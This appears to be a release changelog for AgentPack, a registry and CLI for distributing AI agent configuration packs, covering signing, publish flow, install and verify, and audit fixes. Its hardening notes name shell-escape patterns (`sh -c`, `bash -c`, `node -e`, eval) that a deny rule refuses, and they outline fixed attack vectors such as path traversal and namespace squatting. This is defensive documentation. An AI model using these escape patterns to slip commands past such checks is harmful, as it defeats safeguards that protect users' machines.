- Registry — new `pack_signatures` table (migration `0002_signatures.sql`), `POST /api/publish/<id>/finalize` accepts and server-verifies the signature before persisting, `GET /api/v1/packs/<pub>/<pack>/versions/<v>/signatures` exposes the proof.
- Registry UI — `SignatureBadge` component renders "Signed by @<github>" with link to the Rekor entry, or muted "Unsigned" otherwise.
- 12 new envelope-schema + identity-gate tests; live Fulcio/Rekor smoke deferred to the publish→install smoke harness.

**Security hardening — pre-Phase-4 audit findings**

Pre-Phase-4 security review flagged four issues that would have shipped to production without an audit. All four landed in this release before any signing code wrapped them:

- **C1 (critical)** — `POST /api/publish/<id>/finalize` no longer accepts arbitrary authenticated bearer tokens. The token MUST own the original publish (`pub.createdBy === verified.userId`) AND hold `publish:packs:<publisher>` scope. Removes the publisher-namespace squat vector.
- **H1 (high)** — R2 presigned PUT URLs now use S3 `ChecksumSHA256` (base64-encoded sha256 of the bytes) signed into the URL. R2 rejects the upload if the actual body hash doesn't match. The pre-fix `x-amz-meta-sha256` was an unchecked label.
- **H2 (high)** — `publishInitRequestSchema` now requires `manifestBytes` (positive integer, capped at 1 MiB). The pre-fix path presigned the manifest with `ContentLength: 0`, leaving it unbounded and unverified.
- **H3 (high)** — Per-file size cap (50 MiB), per-pack size cap (200 MiB), file-count cap (2000). Prevents resource-exhaustion via init-bomb.

Medium-severity items (in-memory device-code store, low userCode entropy, CSRF on `approve`, AUTH_SECRET soft-fail) are tracked for the next hardening pass; none block the v0.3.0 promotion since exploitation requires already holding a valid session.

**Live infra wiring**

- `apps/registry/vercel.json` — framework + region (`iad1`) + monorepo-aware install + build commands + security headers.
- `apps/registry/.env.example` — comprehensive template for `DATABASE_URL`, `AUTH_SECRET`, `AUTH_GITHUB_ID/SECRET`, `R2_*`, `NEXT_PUBLIC_REGISTRY_URL`, optional `SIGSTORE_ID_TOKEN`.
- `scripts/bring-up-prod.sh` — guided runbook: create Vercel project under the operator's Vercel team, create Neon project + DB, create Cloudflare R2 bucket + token, register a GitHub OAuth app, set every secret in Vercel, run `db:push` against live Neon, seed publishers, deploy.
- `scripts/smoke-e2e.sh` — end-to-end publish → install → verify smoke. Exercises live `/api/v1/health`, publishes a smoke version, installs into a tempdir, asserts lockfile manifestChecksum matches the registry, runs `agentpack verify` on the install. Records results to `smoke-results.json` with exit-code taxonomy (0 green, 2 registry down, 3 publish failed, 4 install failed, 5 checksum mismatch, 6 drift).
- `apps/registry/app/api/v1/health/route.ts` — probes Postgres + R2 reachability, returns `{ status, db, r2, version, duration_ms, timestamp }`; 200 ok / 503 degraded.

**Phase 6 — explicit deferral gate**

- `Plans/PHASE-6-GATE.md` — pins the trigger condition ("first paying-customer conversation about enterprise self-host"), names the 4 concrete qualifiers, lists the 8 design decisions to revisit when triggered, confirms schema slots already reserved (`org_id` nullable, `audit_events` table) stay valid through Phase 4 so the unlock is a migration not a re-architecture. Includes the gate-flip procedure for when the trigger fires.
- ROADMAP § Phase 6 prefixed with 🔒 GATED marker pointing to the gate doc.
- STATUS.md updated to reflect open-source positioning + Phase 6 gated state.

**Test status**

All workspace test suites green. 250 tests passing (238 from v0.3.0-rc.1 + 12 new signing envelope tests).

**Verification pass + regression fixes (commit `014bb67`)**

End-of-session sweep against every ROADMAP gate criterion. Two regressions surfaced and fixed inline before the session closed:

- `agentpack install examples/pr-quality` (local path with a slash) matched the Phase 5 `REMOTE_ID_RE` and fell through to the remote fetcher, returning "fetch failed" against the default registry. Fix: stat the path first; if it's a directory, prefer local. Remote-id still wins when there's no matching directory.
- `apps/registry/tests/protocol-schemas.test.ts` was missing `manifestBytes` in the well-formed body fixture after the H2 schema tightening, leaving 1 registry test red. Updated.

Verification matrix shipped offline-green for Phases 1-6: doctor/validate/inspect/plan/init/pack-export×5; install/verify-clean/drift→exit-2/diff/history/uninstall-conflict/uninstall--force; registry JSON-fallback boot (`/`, `/packs`, `/packs/<pub>/<slug>` all 200; `/api/v1/health` 503-degraded shape correct; `/api/v1/.../signatures` 503 db_unconfigured); Phase 4 envelope tests + CLI flag surfaces + `verify --sig --strict` → exit 5 + `install --require-sig` local → exit 2 + "Unsigned" badge rendered in HTML; cache + login/whoami/tokens subcommands; Phase 6 gate doc verified. Live deploy + live Sigstore round-trip remain the only deferred gates — both blocked on user-supplied credentials.

## 0.3.0-rc.1 — 2026-05-18 (Phase 3 + Phase 5 scaffold)

End-to-end supply chain skeleton: publish → fetch → install → verify all wired in code. Real Neon DB, GitHub OAuth, and R2 bucket plug in via env vars; the build, tests, and typecheck run cleanly without them. 117 new ISCs (ISC-151..267).

**`@agentpack/db` — new workspace package**

- Drizzle schema for 13 registry tables + 3 Auth.js adapter tables matching `Plans/PROTOCOL.md` § 4 verbatim: `users`, `publishers`, `publisher_members`, `packs` (with `tsvector` generated FTS column + GIN index), `pack_versions`, `atoms`, `pack_files`, `compatibilities`, `api_tokens`, `publishes`, `reviews`, `audit_events` (Phase 6 reserved), `accounts`, `sessions`, `verification_tokens`.
- Query helpers for packs, publishers, tokens, publishes. Drizzle ORM + `postgres` driver + `@neondatabase/serverless`.
- Hand-written `migrations/0000_init.sql` covers every table, FK, unique constraint, GIN index, and the `pack_version_status` enum.
- 19 unit tests (type-inference + query-signature smoke).

**Protocol commit (`packages/core/src/protocol/`)**

- Zod schemas pinning every wire shape: `PublishInitRequest/Response`, `PublishFinalizeRequest/Response`, `RegistryPack`, `RegistryVersion`, error envelopes, `cliAuthInit/Poll`, primitives (`slug`, `semver`, `sha256Hex`, relative path), token format (`agp_live_` + 32-hex), token scopes, `DEFAULT_REGISTRY_URL`.
- `ExitCode` enum (0/1/2/3/4/5/6/7/9) + `errorNameToExitCode` mapper.

**`packages/core/src/registry-client/`**

- `RegistryClient` interface with `listVersions`, `getVersion`, `fetchManifest`, `fetchAtomFile` (sha256-verifying — mismatch → `IntegrityError` → exit 7).
- `HttpRegistryClient` against the Phase 3 API. Sends `Authorization: Bearer` when token present.
- `InMemoryRegistryClient` fixture for tests.
- `resolveLatestVersion` picks highest non-prerelease semver, returns null if list empty or all prerelease.
- 16 tests.

**`packages/core/src/cache/`**

- Content-addressed blob store at `~/.agentpack/cache/blobs/<sha[0..2]>/<sha>`.
- `writeBlob` verifies `sha256(bytes) === sha` before atomic rename; mismatch → `IntegrityError`. `fetchAndCache` integrates the integrity check with HTTP fetch.
- `cacheSize`, `cachePrune({ maxAgeMs })`, `cacheClear` — every candidate path's realpath must be inside `<blobs>` (anti-criterion ISC-246).
- 13 tests.

**`packages/core/src/policy/`**

- Zod schema for `agentpack.policy.json` v1 per protocol § 7.
- `loadPolicy(projectRoot)` returns config or null. Invalid JSON / schema → `PolicyParseError`.
- `enforcePolicy(policy, plan, registryUrl)` reports all violations at once (registry → publisher → blockedPack → unsigned → profile → atomType). Empty plan → `{ ok: true }`. Violations → exit 6 via the CLI.
- 12 tests.

**`apps/registry` (Next.js 15 App Router)**

- `lib/{db,auth,tokens,r2}.ts` — DB client (re-exports `@agentpack/db` schema), NextAuth v5 + Drizzle adapter with GitHub OAuth, token mint/verify (sha256 storage + scope check, fire-and-forget `last_used_at`), R2 client + presigner + HEAD + stream.
- API routes:
  - `/api/auth/[...nextauth]` — NextAuth handler.
  - `/api/tokens` GET/POST, `/api/tokens/[id]` DELETE — list, mint, revoke.
  - `/api/cli/auth/init|approve|poll` — device-code flow for `agentpack login`.
  - `/api/me` — bearer-authed user info.
  - `/api/publish/init`, `/api/publish/[publishId]/finalize` — two-phase publish with presigned R2 PUT URLs and HEAD-only size verification at finalize.
  - `/api/packs`, `/api/packs/[publisher]/[pack]`, `.../versions/[version]`, `.../manifest.yaml`, `.../atoms/[atomId]/[...path]` — read API with R2-streamed bytes, immutable cache headers, 451-on-quarantined.
  - `/api/search` — Postgres FTS via `plainto_tsquery` + `ts_rank_cd`.
  - `/api/packs/.../reviews` — GET returns seed reviews; POST returns 501 (per ROADMAP D3.7).
- `/(authed)/tokens/page.tsx` — user token management UI.
- `lib/cli-auth-store.ts` — in-memory device-code store (15-min TTL).
- Graceful cascade: every route returns 503 (`db_unconfigured` / `r2_unconfigured`) when env vars are missing.
- 18 tests (protocol schemas + token primitives).

**`packages/cli` — 5 new commands + remote install branch**

- `agentpack login` — device-code OAuth against the registry. Writes `~/.agentpack/credentials.json` with mode `0o600`. Token display always masked (`agp_live_xxxx…<last-4>`).
- `agentpack whoami` — bearer-authed `/api/me` read.
- `agentpack tokens list|create|revoke` — manage API tokens.
- `agentpack publish` — load manifest, compute per-file sha256, two-phase publish (`init` → PUT each presigned URL → `finalize`). Handles 401/403/409/422/410 with the right exit code.
- `agentpack cache size|prune|clear` — manage the local blob cache.
- `agentpack install <publisher>/<pack>[@version] --registry <url>` — remote-resolver branch in `install.ts`: identity regex match → `HttpRegistryClient` → `resolveLatestVersion` (if no `@version`) → fetch + verify + cache → materialize temp dir → hand off to existing Phase 2 `planInstall`/`applyInstall`. `loadPolicy` + `enforcePolicy` run pre-install; violation → exit 6.
- `packages/cli/src/lib/credentials.ts` — `~/.agentpack/credentials.json` read/write/clear with `0o600` perms, atomic write, `AGENTPACK_TOKEN` env override.
- 8 new credentials tests.

**Docs**

- `docs/registry.md` — architecture, schema, auth, publish flow, search, reviews-deferred, storage, local-dev.
- `docs/publish.md` — `agentpack publish` reference, token model, CI publishing recipe.
- `docs/remote-install.md` — identity grammar, fetch pipeline, cache, policy hooks, exit codes.
- `docs/policy.md` — `agentpack.policy.json` schema, enforcement order, examples.

**Protocol**

- `Plans/PROTOCOL.md` — pinned token format (`agp_live_` + 32-hex + sha256 storage + scopes), publish trust model (HEAD-only at finalize; full re-hash deferred to Phase 4), wire shapes, DB column names, exit codes, cache layout, policy schema, NextAuth config, pinned deps.

**Deps added**

- Root: `drizzle-kit@0.31.10`, `tsx@4.19.2` (devDeps); `seed:import`, `db:push`, `db:generate` scripts.
- `packages/db`: `drizzle-orm@0.45.2`, `postgres@3.4.9`, `@neondatabase/serverless@1.1.0`.
- `apps/registry`: `next-auth@5.0.0-beta.31`, `@auth/drizzle-adapter@1.11.2`, `@aws-sdk/client-s3@3.1049.0`, `@aws-sdk/s3-request-presigner@3.1049.0`, `drizzle-orm@0.45.2`, `postgres@3.4.9`, `@neondatabase/serverless@1.1.0`, `@agentpack/db@workspace:*`. Test stack: `vitest@2.1.8` + `@vitest/coverage-v8@2.1.8`.

**Test totals**

- **238 tests passing** (up from 172 pre-iteration): 19 db + 166 core + 18 registry + 35 cli.
- All packages typecheck and build cleanly without DATABASE_URL / R2 / GitHub OAuth env vars.

**What's deferred to dedicated sessions**

- **Phase 4** — Sigstore cosign keyless signing, `agentpack verify --sig`, quarantine UI. Lockfile slots already reserved.
- **Phase 6** — Orgs, WorkOS SSO, audit-events chain wiring, policy-as-code overlay. Schema rows reserved.
- **Phase 7** — AgentPack workflow import, trust signal aggregation, Agent Commons bridge.

## 0.2.0 — 2026-05-18 (Phase 2 — local install / uninstall / verify)

Phase 2 of the implementation plan: extend the standard from "compile to native files" to "install into a project root with full provenance, drift detection, and reversibility." 74 new ISCs land (ISC-69..ISC-142, plus ISC-143..ISC-150 from the advisor-driven WAL pass).

**Core engine (`@agentpack/core/install/`)**

- `planInstall()` — classifies every target path against the user's project: `created` / `modified` / `unchanged` / `conflict` (no-marker-existing-content or other-pack-marker). Computes the lockfile inline.
- `applyInstall()` — write-ahead log to `.agentpack/history.jsonl`: append `install_begin` (with `plannedFiles[]` + SHA-256), backup overwritten files to `.agentpack/backups/<pack>/<ts>.<nonce>/`, atomic write of every adapter file (tmp + rename), write `AGENTPACK.lock` at project root, write install manifest at `.agentpack/installed/<pack>.json`, append `install_commit`.
- `uninstall()` — read install manifest, restore backups, delete created files, prune empty parent dirs, delete manifest, append `uninstall` history entry. Refuses without `--force` when user has edited a tracked file since install.
- `verifyInstall()` — recompute SHA-256 of every tracked file vs. the install manifest's recorded hash. Reports `drift[]` / `missing[]`. `--chain` also verifies the history hash chain.
- `rollback()` — undo the most recent install, or with `--to <historyId>`, undo everything after that entry. Refuses superseded installs without `--cascade`.
- `recoverIncomplete()` — sweep for dangling `install_begin` entries on every install. Roll forward (write missing commit) when staged files match the planned SHA-256s, roll back (delete partial files) otherwise.

**Lockfile (`AGENTPACK.lock`, deterministic, committed)**

- Per-atom + per-file SHA-256 — per-file granularity is the unlock primitive for Phase 4 signature verification (cosign signs file digests, not logical atoms).
- `manifestChecksum`: SHA-256 of the raw `AGENTPACK.yaml` bytes (not parsed-then-stringified).
- `canonicalization: { algorithm, encoding, lineEndings }` pinned explicitly.
- `signatures` / `dependencies` reserved (empty in Phase 2) to avoid a v2 bump when Phase 3/4 land.
- **No `installedAt` field** — timestamps would break determinism. Two clean installs at the same version produce byte-identical lockfiles.

**History (`.agentpack/history.jsonl`, append-only, hash-chained)**

- ULID-style monotonic `id`, `previousEntryId` + `entryChecksum` form a hash chain.
- `entryChecksum = sha256(canonicalJson(entry minus entryChecksum))` — canonical JSON with recursively-sorted keys.
- mtime-based file lock around every append (single-writer guarantee under concurrent CLI invocations).
- WAL semantics: `install_begin` (with `plannedFiles[]`) before any file write; `install_commit` last; absence of commit is the crash signal.
- Rotation NOT supported in Phase 2 — file grows monotonically (documented in `docs/install.md`).

**CLI (six new subcommands)**

- `agentpack install <pack> --target X --profile Y --project <dir>` — diff + prompt + write. `--dry-run`, `--yes`, `--force`.
- `agentpack uninstall <packId>` — `--yes`, `--force`, `--force-restore`.
- `agentpack diff <pack>` — unified diff between current project and install plan.
- `agentpack history` — list, `--pack`, `--limit`, `--json`.
- `agentpack rollback [historyId]` — `--to`, `--pack`, `--cascade`, `--yes`.
- `agentpack verify <packId>` — drift report. `--chain` validates hash chain. Exit codes: 0 clean, 2 drift, 3 chain broken.

**Registry web app**

- `InstallCommandBox` surfaces `install`, `pack export`, `verify`, and `validate` with explanatory copy.
- `/docs` documents Phase 2 install / uninstall / verify / rollback surface.

**Docs**

- New `docs/install.md` — full reference for the Phase 2 surface.
- README quickstart includes install/verify/uninstall/rollback/history examples.

**Tests**

- 48 new tests (39 core + 9 CLI) across 7 new files. **Total: 172 tests passing.**
- Core coverage: 88.32% lines / 76.04% branches / 96.39% functions / 88.32% statements (thresholds met).

## 0.1.1 — 2026-05-18 (hardening pass)

Multi-agent security review (security-reviewer, Silas, code-reviewer, silent-failure-hunter, type-design-analyzer) closed four critical attack chains and seven high/medium findings against the v0.1 MVP.

**Security**

- `atom.path` traversal closed: schema rejects absolute paths, `..` segments, and `~/` home expansion. I/O layer enforces realpath containment and refuses symlinks at the atom path. Closes Silas Chain 1.
- Hook `handler.command` injection closed: hook commands MUST appear in `permissions.shell.commands`; shell escape patterns (`sh -c`, `bash -c`, `node -e`, eval) refused outright. Closes Silas Chain 2.
- MCP shell escape closed: `mcp_server` invoking `sh|bash|node|python` with `-c`/`-e`/`--eval` raised to critical risk. Closes Silas Chain 5.
- Risk-engine under-reporting closed: `hook` and `mcp_server` atoms floor at `high` regardless of declared `risk_level`. Audit-trail records every atom + permission (not just deltas). Closes Silas Chain 4.
- Prototype-pollution-safe stable JSON serialization (drops `__proto__`, `constructor`, `prototype` keys).
- Manifest size cap: 1 MiB on disk, 256 KiB through the registry `/validate` server action.
- TOML escape now covers `\n`, `\r`, `\t`, and C0/C1 control characters.

**Correctness**

- `summarizePermissions` surfaces previously-dropped `user_data_access` and `private_context_access` pack-level flags.
- `exportPack` strict mode refuses to ship degenerate output when atom body files are missing (new `--allow-missing` opt-in).
- Profile resolution refuses silent fallback to `safe`; the planner errors when no profile is declared.
- `extractFieldFromYaml` regex extractor replaced with the real `yaml` parser inside the Claude Code adapter.
- ChatGPT adapter splits identifier-safe slug (binding names) from filesystem-safe slug (import paths).
- CLI `validate` / `inspect` / `plan` wrap their action bodies in `try/catch` and render polished error output instead of Node stack traces.
- Validator: case-insensitive duplicate-atom-id detection; unknown permission categories warn; `exports.default_profile` is checked against declared profiles.

**Tooling**

- 58 new tests (22 security + 18 coverage-fill + 18 CLI) for **85 total**.
- vitest coverage thresholds: 85% lines/functions/statements, 75% branches. Current: 90.5% / 98.3% / 90.5% / 77.1%.
- ESLint flat config (typescript-eslint), Prettier config, root `pnpm verify` script.
- `.github/workflows/ci.yml` running typecheck/lint/test/build + a CLI smoke export.
- `LICENSE` (MIT), `CONTRIBUTING.md`, `SECURITY.md`.

## 0.1.0 — 2026-05-18

Initial MVP build of the AgentPack standard + AgentPack Registry monorepo.

- `@agentpack/core`: zod-backed schema, parser, validator, permission summary engine, risk engine, planner, install-plan builder, exportPack convenience entry, and seed-pack module.
- Five adapters: `claude-code`, `codex`, `cursor`, `chatgpt` (export-only), `generic`. Deterministic output, BEGIN/END markers in instruction files.
- `@agentpack/cli`: `init`, `validate`, `inspect`, `plan`, `pack export`, `doctor` (commander + picocolors + ora + diff).
- `@agentpack/registry`: Next.js App Router app with `/`, `/packs`, `/packs/[publisher]/[slug]`, `/validate`, `/docs`. Eight local components, Tailwind, seed data, server actions for validation.
- Example pack `examples/pr-quality` exercises every atom type and compiles to all five targets.
- 27 vitest tests across manifest, risk, and adapter coverage.
- README, `docs/agentpack-standard.md`, `docs/security.md`, `docs/adapters.md`, `docs/cli.md`.
- Project ISA at `ISA.md` — 68 testable ISCs covering build, schema, permissions, risk, CLI, adapters, registry, docs, and anti-criteria.
